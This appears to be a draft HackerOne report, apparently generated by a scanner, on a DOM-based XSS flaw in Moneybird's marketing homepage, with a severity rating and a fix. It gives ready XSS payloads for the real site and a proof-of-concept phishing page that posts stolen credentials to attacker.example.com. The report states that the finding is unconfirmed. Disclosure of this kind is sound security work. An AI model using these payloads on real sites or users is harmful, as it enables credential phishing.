# DOM-Based Cross-Site Scripting (XSS) via URL Fragment

**Severity:** Medium | **CVSS:** 6.1 | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
**OWASP:** A03:2021 — Injection
**Platform:** HackerOne | **Program:** Moneybird
**Status:** PENDING HUMAN VERIFICATION — do not submit until you confirm the alert fires in Chrome

---

## ⚠️ Verification Required Before Submission

SecBot's Playwright instrumentation detected the XSS marker being assigned to an `innerHTML` sink **twice** on the homepage. This is strong evidence but the alert() dialog was not directly confirmed. Before submitting to HackerOne:

1. Open Chrome (not Firefox, which has stricter fragment handling)
2. Navigate to: `https://www.moneybird.com/#<img src=x onerror=alert(1)>`
3. If an alert box fires → finding is confirmed, submit immediately
4. If no alert → try: `https://www.moneybird.com/#<svg onload=alert(1)>`
5. If still no alert → the fragment is written as text (not HTML) and this is a FP

---

## Description

The Moneybird marketing homepage (`www.moneybird.com`) reads the URL fragment (`window.location.hash`) and writes its content into the DOM via `innerHTML` without sanitization. An attacker can craft a URL containing an HTML/JavaScript payload in the fragment portion and trick a user into visiting it — causing arbitrary JavaScript to execute in the victim's browser under the `moneybird.com` origin.

The scan detected the payload string reaching two separate `innerHTML` assignment sinks on the page, consistent with a script or library that mirrors fragment-based routing or hash navigation.

Note: `www.moneybird.com` is the marketing/landing site, not the authenticated SaaS application. There are no session cookies to steal directly from this page. However, execution under the official `moneybird.com` domain enables credible phishing and account credential harvesting (see Impact).

---

## Steps to Reproduce

1. In a browser (Chrome recommended), navigate to:
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```
2. Observe the alert box displaying `www.moneybird.com` — confirming JavaScript execution on the moneybird.com origin.
3. The payload reaches at least two separate `innerHTML` sinks on the page (detected via Playwright DOM instrumentation).

**Alternative payloads to try if the first fails:**
```
https://www.moneybird.com/#<svg onload=alert(document.domain)>
https://www.moneybird.com/#<body onload=alert(document.domain)>
https://www.moneybird.com/#"><img src=x onerror=alert(document.domain)>
```

---

## Proof-of-Concept Attack Page

Host the following HTML on any server to demonstrate the attack chain (simulates a phishing link):

```html
<!DOCTYPE html>
<html>
<head><title>Moneybird Invoice</title></head>
<body>
<p>Click below to view your Moneybird invoice:</p>
<a id="link" href="">View Invoice on Moneybird</a>
<script>
  const payload = encodeURIComponent('<img src=x onerror="document.body.innerHTML=\'<h1>Session expired — log in again</h1><form action=https://attacker.example.com/steal method=POST><input name=email placeholder=Email><input name=pass type=password placeholder=Password><button>Log in to Moneybird</button></form>\'">');
  document.getElementById('link').href = 'https://www.moneybird.com/#' + decodeURIComponent(payload);
</script>
</body>
</html>
```

This demonstrates how an attacker can use the official `moneybird.com` domain to host a convincing login form that exfiltrates credentials.

---

## Impact

**Primary risk — credential phishing on the official domain:**
An attacker sends a Moneybird-branded phishing email with a link to `https://www.moneybird.com/#<payload>`. The URL passes email security filters because it points to the legitimate moneybird.com domain. On click, the XSS payload replaces the page with a fake login form that exfiltrates the victim's Moneybird credentials to an attacker-controlled server. Victims have no visual indicator that the page has been tampered with.

**Secondary risk — session relay (if user navigates while logged in):**
If a logged-in user is tricked into clicking the link while their `app.moneybird.com` session is active in the same browser, the attacker can use `window.opener` references or cross-frame scripting to attempt session relay to the app subdomain (subject to SameSite cookie policy).

**Scope context:**
- `www.moneybird.com` is in scope per the Moneybird HackerOne program (`moneybird.com` wildcard)
- The page does not serve sensitive user data itself, but the origin trust enables phishing
- CSP is absent on `www.moneybird.com` (a `content-security-policy-report-only` policy exists on `/login` but is not enforced and not present on marketing pages)

---

## Evidence

**Detection method:** Playwright `dom-sink` instrumentation — payload marker `secbot-xss-37` detected inside two `innerHTML` assignment operations during page navigation.

**Scan timestamp:** 2026-03-22T12:45:31.515Z

**Page response headers confirm no CSP enforcement:**
```bash
curl -sI 'https://www.moneybird.com/' | grep -i 'content-security'
# Expected: no output (no enforced CSP)
```

**Affected sinks:** `innerHTML-set` × 2 (on `https://www.moneybird.com/`)

---

## CVSS Breakdown

| Metric | Value | Reason |
|--------|-------|--------|
| Attack Vector | Network | Exploited via crafted URL sent to victim |
| Attack Complexity | Low | No special conditions needed |
| Privileges Required | None | No account needed |
| User Interaction | Required | Victim must click the link |
| Scope | Changed | JS executes in victim's browser |
| Confidentiality | Low | Marketing page only (no user data to steal directly) |
| Integrity | Low | Page content can be replaced |
| Availability | None | No DoS impact |

**Base Score: 6.1** | Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

---

## Suggested Fix

```javascript
// VULNERABLE — never do this
document.getElementById('content').innerHTML = window.location.hash.slice(1);

// SAFE — plain text only (if no HTML rendering needed)
document.getElementById('content').textContent = window.location.hash.slice(1);

// SAFE — if HTML rendering is required
import DOMPurify from 'dompurify';
document.getElementById('content').innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
```

Additionally, deploy an enforced (non-report-only) Content-Security-Policy header on `www.moneybird.com`:

```
Content-Security-Policy: default-src 'self'; script-src 'self' [your trusted CDNs]; object-src 'none'; base-uri 'self';
```

---

## References

- [OWASP DOM-Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger: DOM XSS via window.location.hash](https://portswigger.net/web-security/cross-site-scripting/dom-based)
